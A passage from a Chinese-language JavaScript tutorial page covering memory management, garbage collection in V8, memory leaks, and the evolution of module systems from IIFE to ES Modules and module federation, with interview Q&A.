1～10MB），由操作系统直接管理</li><li>分配和回收速度快（通过移动栈指针实现）</li><li>函数执行完毕后，局部变量自动释放</li></ul><p><strong>堆内存（Heap）</strong></p><p>堆内存负责存储引用类型（对象、数组、函数等）的实际数据，其特点是：</p><ul><li>空间动态（64位系统上限约为 1.4GB），由垃圾回收器（GC）管理</li><li>分配与回收成本高，需要避免内存碎片</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 示例：内存分配</span><br><span class="hljs-keyword">let</span> num = <span class="hljs-number">10</span>;          <span class="hljs-comment">// 栈：基本类型</span><br><span class="hljs-keyword">let</span> obj = &#123; <span class="hljs-attr">id</span>: <span class="hljs-number">1</span> &#125;;   <span class="hljs-comment">// 堆：对象数据，栈中存储其引用地址</span><br></code></pre></td></tr></table></figure><h2 id="内存使用规则"><a href="#内存使用规则" class="headerlink" title="内存使用规则"></a>内存使用规则</h2><ul><li>基本类型：直接操作栈内存中的值（按值访问）</li><li>引用类型：通过栈内存中的引用地址操作堆内存中的数据（按引用访问）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> a = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span> &#125;;<br><span class="hljs-keyword">let</span> b = a;  <span class="hljs-comment">// b 复制 a 的引用地址，指向同一堆对象</span><br>b.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Bob&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">name</span>); <span class="hljs-comment">// &quot;Bob&quot;（堆内数据被修改）</span><br></code></pre></td></tr></table></figure><h2 id="垃圾回收算法"><a href="#垃圾回收算法" class="headerlink" title="垃圾回收算法"></a>垃圾回收算法</h2><p>JavaScript 主要使用两种垃圾回收算法：</p><p><strong>标记-清除算法（Mark-and-Sweep）（主流算法）</strong></p><p>工作原理：</p><ul><li>标记阶段：从根对象（全局对象、当前执行栈等）触发，递归标记所有可达对象</li><li>清除阶段：回收所有未被标记的对象</li></ul><p>优点：</p><ul><li>解决了循环引用的问题</li><li>实现相对简单</li></ul><p>缺点：</p><ul><li>可能造成内存碎片</li><li>全堆扫描可能影响性能</li></ul><p>内存碎片的问题可以通过：标记-整理（Mark-Compact）将存活对象移至内存一端</p><p><strong>引用计数算法（Reference Counting）（已淘汰）</strong></p><p>工作原理：</p><ul><li>统计对象被引用的次数，归零时释放</li></ul><p>优点：</p><ul><li>立即回收、内存释放及时</li><li>执行过程分散，没有明显停顿</li></ul><p>缺点：</p><ul><li>无法处理循环引用</li><li>计数器维护开销大</li></ul><p>现代浏览器已不再单独使用引用计数算法</p><h2 id="V8-引擎的垃圾回收机制"><a href="#V8-引擎的垃圾回收机制" class="headerlink" title="V8 引擎的垃圾回收机制"></a>V8 引擎的垃圾回收机制</h2><p><strong>分代式垃圾回收</strong></p><p>V8将堆内存分为两个主要区域：</p><p>新生代：</p><ul><li>存放生存时间短的对象</li><li>容量小（通常 1～8MB）</li><li>回收频繁</li><li>采用 Scavenge 算法（一种复制算法）</li></ul><p>老生代：</p><ul><li>存放生存时间长的对象</li><li>容量大</li><li>回收频率较低</li><li>采用 标记-清除 和 标记-压缩 算法</li></ul><p><strong>回收过程详解</strong></p><p>新生代回收过程：</p><ul><li>将新生代区域分成两个空间：From 和 To</li><li>将对象分配到 From 空间</li><li>当 From 空间满时，标记 From 空间内的活跃对象，并将活跃对象复制到 To 空间，执行垃圾回收清空 From 空间，同时交换 From 空间和 To 空间</li><li>对象经历多次回收晋升为老生代</li></ul><p>老生代回收过程：</p><ul><li>标记阶段：从根对象出发，采用三色标记法（白、灰、黑）标记可达对象</li><li>清除&#x2F;压缩阶段：清除未标记对象或压缩内存消除碎片</li></ul><p><strong>增量标记与惰性清理</strong></p><ul><li>增量标记：将标记过程拆分为多个小任务，与 JavaScript 执行交替进行，避免长时间阻塞主线程</li><li>惰性清理：延迟清理过程，按需清理内存，进一步减少对主线程的影响</li></ul><h2 id="内存泄露与排查"><a href="#内存泄露与排查" class="headerlink" title="内存泄露与排查"></a>内存泄露与排查</h2><p><strong>常见的内存泄露场景</strong></p><p>（1）意外的全局变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">leak</span>(<span class="hljs-params"></span>) &#123;<br>  leakedVar = <span class="hljs-string">&#x27;意外全局&#x27;</span>; <span class="hljs-comment">// 未使用var/let/const</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">leakedProp</span> = <span class="hljs-string">&#x27;意外绑定到全局&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）遗忘的定时器或回调</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> data = <span class="hljs-title function_">fetchData</span>();<br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">process</span>(data); <span class="hljs-comment">// data一直被引用</span><br>&#125;, <span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><p>（3）DOM 引用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> elements = &#123;<br>  <span class="hljs-attr">button</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;button&#x27;</span>)<br>&#125;;<br><br><span class="hljs-comment">// 即使从DOM移除，elements.button仍保留引用，需要置空 button 才能解决</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;button&#x27;</span>));<br></code></pre></td></tr></table></figure><p>（4）闭包滥用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createClosure</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> largeObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-string">&#x27;*&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 即使不使用largeObj，它仍被保留</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;closure&#x27;</span>);<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>内存排查工具</strong></p><p>Chrome DevTools：</p><ul><li>Performance 面板：记录内存变化</li><li>Memory 面板：<ul><li>Heap Snapshot：堆内存快照</li><li>Allocations On Timeline：内存分配时间线</li><li>Allocation Sampling：内存分配采样</li></ul></li></ul><p>Node.js 工具：</p><ul><li>process.memoryUsage()</li><li>–inspect 标识启用调试</li><li>heapdump 模块生成堆快照</li></ul><h2 id="性能优化实践"><a href="#性能优化实践" class="headerlink" title="性能优化实践"></a>性能优化实践</h2><p><strong>编程最佳实践</strong></p><p>（1）避免意外全局变量<br>（2）谨慎使用闭包<br>（3）及时清除定时器和事件监听器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;&#125;, <span class="hljs-number">1000</span>);<br><span class="hljs-built_in">clearTimeout</span>(timer);<br></code></pre></td></tr></table></figure><p>（4）避免内存密集操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 不佳：频繁创建大对象</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">process</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>);<br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-comment">// 较佳：复用对象</span><br><span class="hljs-keyword">const</span> dataPool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">process</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 复用dataPool</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>对象池模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectPool</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">createFn</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">createFn</span> = createFn;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span> = [];<br>  &#125;<br>  <br>  <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span>.<span class="hljs-property">length</span> ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span>.<span class="hljs-title function_">pop</span>() : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createFn</span>();<br>  &#125;<br>  <br>  <span class="hljs-title function_">release</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span>.<span class="hljs-title function_">push</span>(obj);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">const</span> pool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectPool</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000</span>));<br><span class="hljs-keyword">const</span> arr = pool.<span class="hljs-title function_">get</span>();<br><span class="hljs-comment">// 使用后释放</span><br>pool.<span class="hljs-title function_">release</span>(arr);<br></code></pre></td></tr></table></figure><p><strong>WeakMap 和 WeakSet</strong></p><p>WeakMap 和 WeakSet 的键是弱引用，不会阻止 GC 垃圾回收键对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> weakMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br><br>weakMap.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;some data&#x27;</span>);<br>obj = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 现在weakMap中的条目可以被垃圾回收</span><br></code></pre></td></tr></table></figure><h2 id="面试常见问题-5"><a href="#面试常见问题-5" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：JavaScript 是如何管理内存的？</strong></p><p>JavaScript 使用自动垃圾回收机制。主要采用标记-清除算法，V8引擎采用分代回收策略，将堆内存分为新生代和老生代两个区域，分别采用 Scavenge 算法和标记-清除&#x2F;压缩算法</p><p><strong>Q：什么是内存泄露？如何避免？</strong></p><p>内存泄露是指不再被需要的内存未能正确释放。常见的内存泄露场景有：意外的全局变量、游离的 DOM、闭包滥用、未及时清除的定时器&#x2F;事件监听等，可以通过弱引用、对象池、严格模式、及时清理定时器等方法避免</p><p><strong>Q：WeakMap 和 Map 有什么区别？</strong></p><p>WeakMap 的键必须是对象，且是弱引用，不会阻止 GC 垃圾回收器回收键对象；Map 的键可以是任意类型，且保持对键的强引用</p><p><strong>Q：解释下 V8 引擎的回收策略？</strong></p><p>V8 引擎采用分代回收策略，将堆内存分为新生代和老生代两个区域。新生代区域存放小对象、生存时间短的对象，老生代区域存放大对象、生存时间长的对象。新生代采用 Scavenge 算法回收，老生代采用标记-清除&#x2F;压缩算法回收，采用增量标记和惰性清理策略，减少对主线程的影响</p><h1 id="JavaScript模块化机制"><a href="#JavaScript模块化机制" class="headerlink" title="JavaScript模块化机制"></a>JavaScript模块化机制</h1><h2 id="模块化演进史：从混乱到标准化"><a href="#模块化演进史：从混乱到标准化" class="headerlink" title="模块化演进史：从混乱到标准化"></a>模块化演进史：从混乱到标准化</h2><p><strong>原始阶段：全局命名空间污染</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// math.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) &#123; <span class="hljs-keyword">return</span> a + b; &#125;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b, c</span>) &#123; <span class="hljs-keyword">return</span> a + b + c; &#125; <span class="hljs-comment">// 命名冲突</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)); <span class="hljs-comment">// 3 or 6? 结果不可预测</span><br></code></pre></td></tr></table></figure><p><strong>IIFE 模式：初步封装</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 立即执行函数隔离作用域</span><br><span class="hljs-keyword">var</span> calculator = (<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) &#123; <span class="hljs-keyword">return</span> a + b; &#125;<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">add</span>: add<br>  &#125;;<br>&#125;)();<br><br><span class="hljs-comment">// 使用模块</span><br>calculator.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">// 3</span><br></code></pre></td></tr></table></figure><p><strong>CommonJS：Node.js 的模块标准</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// math.js</span><br><span class="hljs-built_in">exports</span>.<span class="hljs-property">add</span> = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b;<br><span class="hljs-built_in">exports</span>.<span class="hljs-property">PI</span> = <span class="hljs-number">3.14159</span>;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./math&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// 5</span><br></code></pre></td></tr></table></figure><p><strong>AMD：浏览器异步加载方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用RequireJS</span><br><span class="hljs-title function_">define</span>([<span class="hljs-string">&#x27;dep1&#x27;</span>, <span class="hljs-string">&#x27;dep2&#x27;</span>], <span class="hljs-keyword">function</span>(<span class="hljs-params">dep1, dep2</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">calculate</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> dep1.<span class="hljs-property">value</span> + dep2.<span class="hljs-property">value</span>;<br>    &#125;<br>  &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>UMD：通用模块定义</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 兼容CommonJS和AMD</span><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params">root, factory</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> define === <span class="hljs-string">&#x27;function&#x27;</span> &amp;&amp; define.<span class="hljs-property">amd</span>) &#123;<br>    <span class="hljs-title function_">define</span>([<span class="hljs-string">&#x27;dep&#x27;</span>], factory);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">exports</span> === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>    <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">factory</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;dep&#x27;</span>));<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    root.<span class="hljs-property">myModule</span> = <span class="hljs-title function_">factory</span>(root.<span class="hljs-property">dep</span>);<br>  &#125;<br>&#125;(<span class="hljs-variable language_">this</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">dep</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123; <span class="hljs-comment">/* 模块内容 */</span> &#125;;<br>&#125;));<br></code></pre></td></tr></table></figure><p><strong>ES Modules：现代 JavaScript 模块标准</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// math.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params">a, b</span>) =&gt; a + b;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14159</span>;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">import</span> &#123; add, <span class="hljs-variable constant_">PI</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./math.js&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-variable constant_">PI</span>, <span class="hljs-variable constant_">PI</span>)); <span class="hljs-comment">// 6.28318</span><br></code></pre></td></tr></table></figure><h2 id="ES-Modules-核心机制深度剖析"><a href="#ES-Modules-核心机制深度剖析" class="headerlink" title="ES Modules 核心机制深度剖析"></a>ES Modules 核心机制深度剖析</h2><p><strong>模块加载三阶段</strong></p><pre class="mermaid">graph TD    A[构建 Construction] --> B[解析模块]    B --> C[建立依赖图]    C --> D[实例化 Instantiation]    D --> E[分配内存]    E --> F[建立导入/导出链接]    F --> G[求值 Evaluation]    G --> H[执行顶层代码]</pre><p><strong>实时绑定原理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// counter.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">increment</span>(<span class="hljs-params"></span>) &#123; count++; &#125;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">import</span> &#123; count, increment &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./counter.js&#x27;</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// 0</span><br><span class="hljs-title function_">increment</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// 1 (值实时更新)</span><br></code></pre></td></tr></table></figure><p><strong>循环引用解决方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// a.js</span><br><span class="hljs-keyword">import</span> &#123; b &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./b.js&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> a = <span class="hljs-string">&#x27;A&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;a中获取b:&#x27;</span>, b); <span class="hljs-comment">// &#x27;B&#x27;</span><br><br><span class="hljs-comment">// b.js</span><br><span class="hljs-keyword">import</span> &#123; a &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./a.js&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> b = <span class="hljs-string">&#x27;B&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;b中获取a:&#x27;</span>, a); <span class="hljs-comment">// undefined (但不会报错)</span><br><br><span class="hljs-comment">// ES Modules 处理循环引用的关键：</span><br><span class="hljs-comment">// 1. 构建阶段建立所有导出绑定</span><br><span class="hljs-comment">// 2. 执行阶段按顺序求值</span><br><span class="hljs-comment">// 3. 未初始化变量值为undefined</span><br></code></pre></td></tr></table></figure><h2 id="现代模块系统核心特性对比"><a href="#现代模块系统核心特性对比" class="headerlink" title="现代模块系统核心特性对比"></a>现代模块系统核心特性对比</h2><table><thead><tr><th align="left">特性</th><th align="left">CommonJS</th><th align="left">ES Modules</th></tr></thead><tbody><tr><td align="left">加载方式</td><td align="left">同步加载</td><td align="left">异步加载</td></tr><tr><td align="left">模块解析时机</td><td align="left">运行时</td><td align="left">编译时（静态）</td></tr><tr><td align="left">导出类型</td><td align="left">值拷贝</td><td align="left">实时绑定（引用）</td></tr><tr><td align="left">循环引用处理</td><td align="left">部分支持（可能出错）</td><td align="left">完全支持</td></tr><tr><td align="left">动态导入</td><td align="left">require()动态语法</td><td align="left">import()函数</td></tr><tr><td align="left">顶层 await</td><td align="left">不支持</td><td align="left">支持</td></tr><tr><td align="left">Tree shaking</td><td align="left">困难</td><td align="left">原生支持</td></tr><tr><td align="left">严格模式</td><td align="left">默认非严格模式</td><td align="left">默认严格模式</td></tr></tbody></table><h2 id="高级模块化计数与实践"><a href="#高级模块化计数与实践" class="headerlink" title="高级模块化计数与实践"></a>高级模块化计数与实践</h2><p><strong>动态导入（Code Spliting）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 按需加载模块</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loadBtn&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-title function_">async</span> () =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; heavyOperation &#125; = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./heavyModule.js&#x27;</span>);<br>  <span class="hljs-title function_">heavyOperation</span>();<br>&#125;);<br><br><span class="hljs-comment">// Webpack 自动代码分割</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">LoginModal</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./LoginModal&#x27;</span>));<br></code></pre></td></tr></table></figure><p><strong>模块重导出</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// utils/index.js</span><br><span class="hljs-keyword">export</span> &#123; <span class="hljs-keyword">default</span> <span class="hljs-keyword">as</span> formatDate &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./dateUtils&#x27;</span>;<br><span class="hljs-keyword">export</span> &#123; encrypt, decrypt &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./cryptoUtils&#x27;</span>;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">import</span> &#123; formatDate, encrypt &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./utils&#x27;</span>; <span class="hljs-comment">// 单一入口</span><br></code></pre></td></tr></table></figure><p><strong>模块联邦（微前端架构）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// app1/webpack.config.js</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ModuleFederationPlugin</span>(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;app1&#x27;</span>,<br>  <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;remoteEntry.js&#x27;</span>,<br>  <span class="hljs-attr">exposes</span>: &#123;<br>    <span class="hljs-string">&#x27;./Button&#x27;</span>: <span class="hljs-string">&#x27;./src/components/Button&#x27;</span>,<br>  &#125;,<br>  <span class="hljs-attr">shared</span>: [<span class="hljs-string">&#x27;react&#x27;</span>, <span class="hljs-string">&#x27;react-dom&#x27;</span>],<br>&#125;);<br><br><span class="hljs-comment">// app2/webpack.config.js</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ModuleFederationPlugin</span>(&#123;<br>  <span class="hljs-attr">remotes</span>: &#123;<br>    <span class="hljs-attr">app1</span>: <span class="hljs-string">&#x27;app1@http://localhost:3001/remoteEntry.js&#x27;</span>,<br>  &#125;,<br>&#125;);<br><br><span class="hljs-comment">// app2 中使用远程模块</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">RemoteButton</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;app1/Button&#x27;</span>));<br></code></pre></td></tr></table></figure><h2 